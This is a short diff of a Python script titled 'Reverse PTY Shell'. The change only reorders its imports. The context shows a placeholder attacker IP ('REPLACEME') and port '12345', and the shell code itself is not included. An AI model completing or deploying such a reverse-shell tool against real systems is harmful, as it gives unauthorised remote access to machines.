@@ -1,10 +1,10 @@
 #!/usr/bin/python3
 """ Reverse PTY Shell """
 
-import sys
-import socket
 import os
 import pty
+import socket
+import sys
 
 attackerip = "REPLACEME"
 attackerport = "12345"
